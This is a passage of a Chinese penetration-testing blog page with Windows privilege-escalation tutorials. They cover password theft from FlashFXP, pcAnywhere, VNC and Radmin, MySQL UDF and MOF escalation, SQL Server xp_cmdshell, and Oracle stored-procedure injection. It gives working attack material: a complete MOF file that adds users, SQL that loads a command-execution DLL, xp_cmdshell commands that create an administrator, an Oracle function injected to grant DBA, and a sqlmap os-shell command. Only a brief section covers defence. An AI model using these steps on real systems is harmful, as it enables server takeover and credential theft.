net localgroup administrator quan /add</code></pre><h5 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h5><p>​     FTP分为主动连接和被动连接，Filezilla的21端口是不能被转发出来的，将21端口转发出来以后，被动连接就会变成主动连接，Filezilla是不支持主动连接的。将21端口转发出来以后就会发生积极拒绝的情况。</p>
<p>​    2008系统权限比2003严格一点，导致系统文件是不能修改和删除重命名，这里是没有办法利用 。如果遇到不能提权的时候，可以使用如下几种提权思路。</p>
<h5 id="扩展知识："><a href="#扩展知识：" class="headerlink" title="扩展知识："></a>扩展知识：</h5><ol>
<li>通过FTP去篡改他桌面上快捷方式，路径指向给修改到我们的恶意程序。（比较被动）不推荐</li>
<li>上传利用到2008启动项 目录里，c:/users/administrator/appdata/roaming/microsoft/windows/start menu/programs/startup/</li>
<li>替换system系统服务程序，进行提权。</li>
</ol>
<h4 id="第三方软件FlashFXP提权"><a href="#第三方软件FlashFXP提权" class="headerlink" title="第三方软件FlashFXP提权"></a>第三方软件FlashFXP提权</h4><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%B8%89%5CQQ%E6%88%AA%E5%9B%BE20200429102747.png" alt=""></p>
<h5 id="1、FlashFXP简介"><a href="#1、FlashFXP简介" class="headerlink" title="1、FlashFXP简介"></a>1、FlashFXP简介</h5><ul>
<li>FlashFXP是一款功能强大的FXP/FTP软件，集成了其它优秀的FTP软件的优点，如CuteFTP的目录比较，支持彩色文字显示；如BpFTP支持多目录选择文件，暂存目录；又如LeapFTP的界面设计。</li>
</ul>
<h5 id="2、提权思路"><a href="#2、提权思路" class="headerlink" title="2、提权思路"></a>2、提权思路</h5><p>利用FlashFXP替换文件漏洞，可以读取管理员链接过的站点账号密码。</p>
<h5 id="3、提权步骤"><a href="#3、提权步骤" class="headerlink" title="3、提权步骤"></a>3、提权步骤</h5><p>（1）下载quick.dat这个文件<br>链接的账号密码都保存在<code>quick.dat</code><br>falshfxp默认安装目录：C:\Program Files\flashfxp</p>
<p>（2）本地覆盖<br>打开我们本机的FlashFTP把原先的文件替换掉</p>
<p>（3）获取网站管理密码<br>打开本机软件，查看历史记录，可以看到受害者主机quick.dat 文件里的服务器、用户名、密码等信息。<br>如果想要获取密码，可下载星号密码查看工具查看暗文</p>
<h4 id="第三方软件pcAnywhere提权"><a href="#第三方软件pcAnywhere提权" class="headerlink" title="第三方软件pcAnywhere提权"></a>第三方软件pcAnywhere提权</h4><h5 id="1、pcAnywhere简介"><a href="#1、pcAnywhere简介" class="headerlink" title="1、pcAnywhere简介"></a>1、pcAnywhere简介</h5><ul>
<li>PcAnywhere是一款远程控制软件，你可以将你的电脑当成主控端去控制远方另一台同样安装有pcANYWHERE的电脑（被控端），你可以使用被控端电脑上的程序或在主控端与被控端之间互传文件。</li>
<li>pcAnywher的默认端口为<code>5631、5632</code>。</li>
<li>pcAnywher的账户和密码保存在一个后缀为<code>.cif</code>的配置文件中,可能是PCA.serven.CIF。</li>
</ul>
<p><strong>2、提权步骤</strong></p>
<p>（1）访问pcAnywhere默认安装目录，查找<code>cif</code>文件并下载<br>默认路径： C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\Hosts</p>
<pre><code>dir *.cif/s</code></pre><p>（2）利用破解工具<code>pcAnywherePWD</code>对<code>cif</code>文件直接进行破解</p>
<p>（3）连接pcAnywhere服务端<br>拿到用户密码后使用客户端连接对pcAnywhere服务端进行连接，之后就和对本地计算机进行操作一样。</p>
<p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99699638" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99699638</a></p>
<h4 id="第三方软件VNC提权"><a href="#第三方软件VNC提权" class="headerlink" title="第三方软件VNC提权"></a>第三方软件VNC提权</h4><h5 id="VNC简介"><a href="#VNC简介" class="headerlink" title="VNC简介"></a>VNC简介</h5><p>VNC (Virtual Network Console)是虚拟网络控制台的缩写。它 是一款优秀的远程控制工具软件，由著名的 AT&amp;T 的欧洲研究实验室开发的。</p>
<h5 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h5><p>安装VNC后会<code>在注册表中保留VNC的密码</code>，通过WEBSHELL远程读取注册表中的密码信息并在本地破解VNC密码进行远程连接来达到提权目的。</p>
<h5 id="提权步骤-1"><a href="#提权步骤-1" class="headerlink" title="提权步骤"></a>提权步骤</h5><p><strong>1、通过读取注册表十进制数</strong><br>（1）RealVNC的注册表路径：</p>
<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4\Password</code></pre><p>（2）UltraVNC的注册表路径：</p>
<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\ORL\WinVNC3\Default\password</code></pre><p><strong>2、转换成十六进制数</strong><br>在线转换进制地址链接：<a href="https://www.toolfk.com/tool-convert-hexadecimal" target="_blank" rel="noopener">https://www.toolfk.com/tool-convert-hexadecimal</a></p>
<p><strong>3、破解十六进制数得到密码</strong><br>使用工具VNC4X进行破解<br>先在CMD输入<code>vncx4.exe -W</code>回车<br>然后将转换后的十六进制挨个输入，每输入一个都按一次回车</p>
<p><strong>4、使用获取到的账号密码连接vnc</strong><br>通过本地的VNC客户端，连接成功后远程操作实现提权</p>
<p>详情参考：<a href="https://blog.csdn.net/God_XiangYu/article/details/99711913" target="_blank" rel="noopener">https://blog.csdn.net/God_XiangYu/article/details/99711913</a></p>
<h4 id="第三方软件Radmin提权"><a href="#第三方软件Radmin提权" class="headerlink" title="第三方软件Radmin提权"></a>第三方软件Radmin提权</h4><h5 id="Radmin简介"><a href="#Radmin简介" class="headerlink" title="Radmin简介"></a>Radmin简介</h5><ul>
<li>Radmin是平时在windows下用的比较多的一个远程管理工具。其具有支持多个连接和IP 过滤(即允许特定的IP控制远程机器)、个性化的档互传、远程关机、支持高分辨率模式、基于Windows NT的安全支持及密码保护以及提供日志文件支持等特性。</li>
<li>默认开放 <code>4899</code>端口</li>
<li>Radmin server2.X、Radmin server3.0都存在一个“致命”漏洞 —— radmin hash提权漏洞</li>
</ul>
<h5 id="提权思路-1"><a href="#提权思路-1" class="headerlink" title="提权思路"></a>提权思路</h5><p>老版本的Radmin会<code>在注册表中保留密码的Hash值</code>，通过WEBSHELL、远程挂马读取注册表中的密码Hash值并在本地破解密码进行远程连接来达到提权目的。</p>
<h5 id="提取步骤"><a href="#提取步骤" class="headerlink" title="提取步骤"></a>提取步骤</h5><p><strong>1、获取MD5Hash值</strong></p>
<pre><code>HKEY_LOCAL_MACHINESYSTEMRAdminv2.0ServerParametersParameter//默认密码注册表位置
HKEY_LOCAL_MACHINESYSTEMRAdminv2.0ServerParametersPort //默认端口注册表位置</code></pre><p><strong>2、使用RadminHash进行登录</strong><br>在<code>Radmin-Hash</code>客户端输入RAdmin客户端的Hash值即可登录。<br>然后在Radmin-Hash客户端新建服务端，输入所要连接的<code>IP</code>或者扫描存活主机进行连接</p>
<p><strong>3、查看远程屏幕</strong></p>
<p>在Radmin客户端选择屏幕控制，输入Hash值即可查看远程主机屏幕。</p>
<p><strong>4、获取并破解密码</strong><br>用mimikatz解析用户密码，也可以通过上传getpw.exe文件获取用户的sam值，再通过LC5解密。</p>
<p><strong>5、登录远程桌面</strong></p>
<p>在本地打开远程桌面连接器，输入远端IP进行登录。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/28/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-er/" itemprop="url">windows渗透测试中常见提权方式总结(二)</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-28T09:56:41+08:00">
                2020-04-28
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="渗透测试中常见提权方式总结（一）"><a href="#渗透测试中常见提权方式总结（一）" class="headerlink" title="渗透测试中常见提权方式总结（一）"></a>渗透测试中常见提权方式总结（一）</h2><h3 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h3><h4 id="mysql之UDF提权"><a href="#mysql之UDF提权" class="headerlink" title="mysql之UDF提权"></a>mysql之UDF提权</h4><h4 id="原理分析："><a href="#原理分析：" class="headerlink" title="原理分析："></a>原理分析：</h4><p>​        <strong>UDF</strong>(user-defined function)是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p>
<p>​    <strong>动态链接库</strong>：是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用</p>
<p>​    <strong>udf是Mysql类提权的方式之一</strong>。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。</p>
<h4 id="提权常见手法："><a href="#提权常见手法：" class="headerlink" title="提权常见手法："></a>提权常见手法：</h4><p>一般来说使用udf提权的常规手法：</p>
<ul>
<li><p>上传大马webshell，利用大马中的UDF提权功能完成提权。</p>
</li>
<li><p>反弹shell，进而获取交互式tty shell，在shell中连接本地数据库，从而完成UDF提权。</p>
</li>
<li><p>利用FuckMySQL，本地执行命令。<a href="https://github.com/v5est0r/Python_FuckMySQL" target="_blank" rel="noopener">FuckMySQL</a>项目针对Windows平台。</p>
</li>
<li><p>利用SQLMAP中的-d参数连接远程数据库，自动上传so库完成UDF提权，从而获取os-shell</p>
</li>
<li><p>使用Navicat等数据库管理工具连接远程数据库，从而完成UDF提权。</p>
<p>其实这些手法的主要目的都是<strong>想方设法登陆数据库服务来执行SQL语句，进而获取到启动MySQL服务的root权限，</strong></p>
</li>
</ul>
<h4 id="提权的一些前提："><a href="#提权的一些前提：" class="headerlink" title="提权的一些前提："></a>提权的一些前提：</h4><p>利用udf提权有一些利用的先决条件：</p>
<ul>
<li>MySQL 数据库没有开启安全模式。</li>
<li>已知的数据库账号具有对 MySQL 数据库 insert 和 delete 的权限，最好是 root 最高权限。</li>
<li>shell 有写入到数据库安装目录的权限。</li>
</ul>
<p><strong>高版本mysql(mysql Version&gt;5.7)遇到的一些问题：</strong></p>
<ul>
<li><p>secure-file-priv默认不为空，即不允许在任意文件夹中导出文件；</p>
<ul>
<li>如果对方开启了安全模式，我们是无法利用这个办法进行提权的，所以，为了完成今天的浮现，我们需要关闭安全模式。</li>
</ul>
<pre><code>secure_file_priv=&quot;&quot;</code></pre><pre><code> 将这个代码插入到 mysql 配置文件的最后，重启服务，便可以关闭安全模式。</code></pre></li>
<li><p>默认root用户使用的authentication-plugins为auth_socket，即在本地登录MySQL时使用unix套接字登录，而非密码；</p>
</li>
<li><p>mysql.user下password列更改为authentication_string列。</p>
</li>
</ul>
<h4 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h4><p>首先通过各种手段获取一个网站的webshell，使用菜刀连接。</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428160603.png" alt=""></p>
<p>这个时候获取到的权限往往是一个低用户权限，我们尝试使用udf数据库提权</p>
<p>我们这里上传一个暗月的mysql数据库提权大马，命名为<code>dama.php</code></p>
<p><a href="https://github.com/tennc/webshell这个里面包含了很多webshell，里面还有几种mysql数据库提权马，也可以试试（建议下到虚拟机里！！！！！）" target="_blank" rel="noopener">https://github.com/tennc/webshell这个里面包含了很多webshell，里面还有几种mysql数据库提权马，也可以试试（建议下到虚拟机里！！！！！）</a></p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428160926.png" alt=""></p>
<p>直接网页访问，提示我们需要数据库密码，这里我们可以到网站下数据库配置文件找下<code>config.php</code></p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428163445.png" alt=""></p>
<p>登录后，发现这里直接给出了一些数据库版本为：5.5.53</p>
<p>还可以执行数据库命令：</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428161455.png" alt=""></p>
<p>这里补充一个点:</p>
<ul>
<li>如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下</li>
<li>如果mysql版本小于5.1，udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录</li>
</ul>
<p>但是mysql默认状态下没有这个文件夹，需要我们自行创建。</p>
<p>用NTFS ADS流模式突破进而创建文件夹</p>
<pre><code>select @@basedir;  //查找到mysql的目录
select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#39;;    //利用NTFS ADS创建lib目录
select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#39;;    //利用NTFS ADS创建plugin目录</code></pre><p>我直接在菜刀下创建plugin文件夹</p>
<p>然后最关键的一步：<strong>导出UDF文件</strong></p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428165018.png" alt=""></p>
<p>导出后，再次尝试文件已经存在，说明导入成功。</p>
<p>现在只是把udf的动态链接库导出到指定文件夹，还不能使用里面的自定义函数。要想使用自定义函数，就要把udf.dll中的自定义函数引入。</p>
<p>引入sys_eval函数：</p>
<pre><code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;moonudf.dll&#39;</code></pre><p>其中，sys_eval函数是执行任意命令，并将输出返回函数的名字，moonudf.dll是你导出文件的名字;</p>
<p>之后使用命令模板即可执行命令：</p>
<pre><code>select sys_eval(&#39;ipconfig)</code></pre><p>也可以直接使用大马这里的功能选项：</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428174431.png" alt=""></p>
<h4 id="其他udf提权方法："><a href="#其他udf提权方法：" class="headerlink" title="其他udf提权方法："></a>其他udf提权方法：</h4><h5 id="msf-udp模块"><a href="#msf-udp模块" class="headerlink" title="msf udp模块"></a>msf udp模块</h5><p>我们使用命令<code>search udf</code>即可看到udf提权payload</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428170837.png" alt=""></p>
<p>进入模块，看一下需要配置选项：</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428170940.png" alt=""></p>
<p>注：这里注意版本，适用于5.5.9以下，</p>
<h5 id="sqlmap命令"><a href="#sqlmap命令" class="headerlink" title="sqlmap命令"></a>sqlmap命令</h5><p>使用SQLMAP的-d命令来连接服务并执行UDF提权语句；</p>
<pre><code>sqlmap -d mysql://root:xxxxxx@VPS:3306/mysql --os-shell</code></pre><h3 id="mysql数据库提权之MOF提权"><a href="#mysql数据库提权之MOF提权" class="headerlink" title="mysql数据库提权之MOF提权"></a>mysql数据库提权之MOF提权</h3><h4 id="原理分析：-1"><a href="#原理分析：-1" class="headerlink" title="原理分析："></a>原理分析：</h4><p>利用了<code>c:/windows/system32/wbem/mof/</code>目录下的 <code>nullevt.mof</code> 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。</p>
<h4 id="提权复现："><a href="#提权复现：" class="headerlink" title="提权复现："></a>提权复现：</h4><p>首先需要具备Mysql的<code>root</code>权限，我们还是使用上面菜刀连接获得的webshell</p>
<p>然后我们将<code>nullevt.mof</code>导入到一下可写目录</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428185617.png" alt=""></p>
<p>文件内容：</p>
<pre><code>#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)
instance of __EventFilter as $EventFilter
{
EventNamespace = &quot;Root\\Cimv2&quot;;
Name = &quot;filtP2&quot;;
Query = &quot;Select * From __InstanceModificationEvent &quot;
&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;
&quot;And TargetInstance.Second = 5&quot;;
QueryLanguage = &quot;WQL&quot;;
};
instance of ActiveScriptEventConsumer as $Consumer
{
Name = &quot;consPCSV2&quot;;
ScriptingEngine = &quot;JScript&quot;;
ScriptText =
&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user test test /add\&quot;)&quot;;
};
instance of __FilterToConsumerBinding
{
Consumer = $Consumer;
Filter = $EventFilter;
};</code></pre><p>这里<code>net user test test /add</code>可以自定义，我们这里就是添加一个test用户。</p>
<p>之后我们使用sql语句将文件导入到<code>c:/windows/system32/wbem/mof/</code>下</p>
<pre><code>select load_file(&quot;C:/phpStudy/WWW/nullevt.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</code></pre><p>可以使用菜刀下的数据库管理工具执行</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428190009.png" alt=""></p>
<p>执行后，到win2003上查看用户：</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428190809.png" alt=""></p>
<p>之后我们可以将自定义的命令改为：</p>
<pre><code>net.exe localgroup administrators test /add</code></pre><p>即可对添加的用户进行提权。</p>
<h4 id="其他mof提权方法："><a href="#其他mof提权方法：" class="headerlink" title="其他mof提权方法："></a>其他mof提权方法：</h4><h5 id="msf-mof提权"><a href="#msf-mof提权" class="headerlink" title="msf mof提权"></a>msf mof提权</h5><p>使用<code>mysql_mof</code>模块，有的版本不能成功，</p>
<h5 id="上传mof-php"><a href="#上传mof-php" class="headerlink" title="上传mof.php"></a>上传mof.php</h5><p>直接上传mof.php执行命令</p>
<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93-%E4%BA%8C%5CQQ%E6%88%AA%E5%9B%BE20200428184713.png" alt=""></p>
<p>我试了几次都失败了，这里应该需要开启mysql远程连接的功能。。。。</p>
<h4 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h4><p>​        Mysql Root权限MOF方法提权其前提条件是能够将上传的nullevt.mof复制到系统目录下，例如c:\windows\system32\wbem\mof中，如果无法复制则会提权失败。一般对Windows2003以下操作系统效果较好，Windows2008以上由于保护机制，较少能够成功。因此可以采取以下措施进行防范：</p>
<ul>
<li>在程序数据库连接文件中尽量不要使用Root帐号进行连接。</li>
<li>Root帐号使用强加密方式，采用字母大小写+数字+特殊字符，密码位数15位以上。</li>
<li>对Mysql数据库的mysql数据库目录权限严格限制，IIS用户无法读写该文件。</li>
</ul>
<h3 id="SQL-Server提权"><a href="#SQL-Server提权" class="headerlink" title="SQL  Server提权"></a>SQL  Server提权</h3><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p><img src="https://img-blog.csdnimg.cn/20190611101318911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg0NTA0,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>xp_cmdshell是Sql Server中的一个组件，我们可以用它来执行系统命令。</p>
<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p><strong>利用前提：</strong></p>
<ul>
<li>getshell或者存在sql注入并且能够执行命令</li>
<li>sql server是system权限，sql server默认就是system权限。</li>
<li>获取SA用户口令</li>
</ul>
<h5 id="获取SA用户口令方法"><a href="#获取SA用户口令方法" class="headerlink" title="获取SA用户口令方法"></a>获取SA用户口令方法</h5><ul>
<li>Webshell或源码获取，一般在网站的配置文件中有存放明文账号密码，常用配置文件名如：</li>
</ul>
<pre><code>conn.aspx
config.aspx
config.php
web.config
.........

一般格式如：

server=localhost;
UID=sa;
PWD=shadowflow</code></pre><p>获得sa口令，即可通过我们上传的大马进行登录，获得sa相应权限</p>
<p>有了xp_cmdshell的话可以执行系统命令，该组件默认是关闭的，因此需要把它打开。</p>
<h5 id="开启xp-cmdshell"><a href="#开启xp-cmdshell" class="headerlink" title="开启xp_cmdshell"></a>开启xp_cmdshell</h5><pre><code>exec sp_configure &#39;show advanced options&#39;, 1;reconfigure;
exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;</code></pre><h5 id="关闭xp-cmdshell"><a href="#关闭xp-cmdshell" class="headerlink" title="关闭xp_cmdshell"></a>关闭xp_cmdshell</h5><pre><code>exec sp_configure &#39;show advanced options&#39;, 1;reconfigure;
exec sp_configure &#39;xp_cmdshell&#39;, 0;reconfigure</code></pre><h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><pre><code>exec master..xp_cmdshell &#39;net user test pinohd123. /add&#39;    添加用户test，密码test
exec master..xp_cmdshell &#39;net localgroup administrators test add&#39;    添加test用户到管理员组</code></pre><h3 id="Oracle数据库提权之注入存储过程提权"><a href="#Oracle数据库提权之注入存储过程提权" class="headerlink" title="Oracle数据库提权之注入存储过程提权"></a>Oracle数据库提权之注入存储过程提权</h3><h4 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h4><p>SYS创建的存储过程存在sql注入。拥有<code>create procedure</code>权限的用户通过创建提权函数，将提权函数注入到存储过程中，于是该存储过程将调用这个提权函数来执行<code>grant dba to quan</code>命令，获得<strong>Oracle数据库dba权限</strong>。</p>
<h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>SYS创建的存储过程<code>存在sql注入</code>（EG：CVE-2005-4832）</li>
<li>用户拥有<code>create procedure</code>权限（用来创建函数）</li>
</ul>
<h4 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h4><p>假设有一个用户quan 只有 CONNECT 和 RESOURCE 权限</p>
<h5 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h5><ul>
<li>用户登陆后执行<code>select * from session_privs</code>查看权限</li>
<li>创建函数，命令为<code>grant dba to quan</code></li>
</ul>
<p>grant execute on pwn to public;//赋予所有用户此函数的执行权限</p>
<pre><code>SQL&gt;create or replace function pwn return vaarchar2
authid current_user is pragma autonomous_transaction;
begin
execute immediate &#39;grant dba to quan&#39;;
return &#39;&#39;;
end;
/

SQL&gt;grant execute on pwn to public;
/</code></pre><p>注入sys.dbms_cdc_subscribe.activate_subscription</p>
<pre><code>SQL&gt;begin
sys.dbms_cdc_subscribe.activate_subscription(&#39;&#39;&#39;||quan.pwn()||&#39;&#39;&#39;);
end;
/

SQL&gt;set role dba;</code></pre><p>执行<code>select * from session_privs</code>查看是否为dba权限</p>
<h5 id="利用MSF注入"><a href="#利用MSF注入" class="headerlink" title="利用MSF注入"></a>利用MSF注入</h5><p>1.加载攻击模块</p>
<pre><code>use auxiliary/sqli/oracle/dbms_cdc_subscribe.activate_subscription</code></pre><p>2.配置参数</p>
<pre><code>set dbuser quan

set dbpass quan123

set sid orcl

set rhost xxxxx

set sql grant dba to quan</code></pre><p>3.run</p>
<h3 id="Oracle数据库提权之通过utl-http-request存储过程提权"><a href="#Oracle数据库提权之通过utl-http-request存储过程提权" class="headerlink" title="Oracle数据库提权之通过utl_http.request存储过程提权"></a>Oracle数据库提权之通过utl_http.request存储过程提权</h3><h4 id="原理分析-2"><a href="#原理分析-2" class="headerlink" title="原理分析"></a>原理分析</h4><p>Oracle9i~11gR2中<code>dbms_xmlquery.newcontext()</code>和<code>dbms_xmlquery.getxml()</code>函数可以执行任意PL/SQL语句，利用这两个函数可以获得Oracle服务器的<strong>操作系统权限</strong>。</p>
<h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>UTL_HTTP存储过程可用</li>
<li>Oracle9i~11gR2</li>
</ul>
<h4 id="提权步骤-1"><a href="#提权步骤-1" class="headerlink" title="提权步骤"></a>提权步骤</h4><ol>
<li>创建Java包</li>
<li>创建存储过程MYJAVACMD</li>
<li>执行存储过程，成功添加用户</li>
</ol>
<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://xz.aliyun.com/t/7392#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/7392#toc-10</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/27/msf-fan-dan-payload-xue-xi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/header.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/27/msf-fan-dan-payload-xue-xi/" itemprop="url">msf反弹payload学习</a></h1>
        

        <div class="post-meta">
